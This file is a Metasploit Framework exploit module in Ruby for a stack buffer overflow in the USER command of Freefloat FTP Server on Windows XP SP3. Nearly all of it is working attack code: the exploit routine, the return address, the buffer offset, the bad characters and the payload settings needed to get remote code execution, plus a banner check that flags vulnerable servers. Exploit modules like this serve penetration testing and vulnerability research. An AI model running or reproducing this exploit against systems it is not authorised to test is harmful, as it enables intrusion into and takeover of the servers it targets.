# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#  http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;       => &#039;Free Float FTP Server USER Command Buffer Overflow&#039;,
      &#039;Description&#039;   => %q{
          Freefloat FTP Server is prone to an overflow condition. It
        fails to properly sanitize user-supplied input resulting in a
        stack-based buffer overflow. With a specially crafted &#039;USER&#039;
        command, a remote attacker can potentially have an unspecified
        impact.
      },
      &#039;Platform&#039;     => &#039;win&#039;,
      &#039;Author&#039;     =>
        [
          &#039;D35m0nd142&#039;, # Original exploit
          &#039;Doug Prostko <dougtko[at]gmail.com>&#039; # MSF module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;   =>
        [
          [ &#039;OSVDB&#039;, &#039;69621&#039;],
          [ &#039;EDB&#039;, &#039;23243&#039;]
        ],
      &#039;Privileged&#039;   => false,
      &#039;Payload&#039;     =>
        {
          &#039;Space&#039;          => 444,
          &#039;DisableNops&#039;    => true,
          &#039;BadChars&#039;       => "\x00\x0a\x0d",
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;Targets&#039;    =>
        [
          [ &#039;FreeFloat / Windows XP SP3&#039;,
            {
              &#039;Ret&#039; => 0x77c35459 , # push esp; ret - mscvrt.dll
              &#039;Offset&#039;   => 230
            }
          ],
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 12 2012&#039;))
  end

  def check
    connect
    disconnect
    if (banner =~ /FreeFloat/)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    connect
    buf = rand_text(target[&#039;Offset&#039;])
    buf << [ target[&#039;Ret&#039;] ].pack(&#039;V&#039;)
    buf << rand_text(8)
    buf << payload.encoded
    send_user(buf)
    disconnect
  end
end

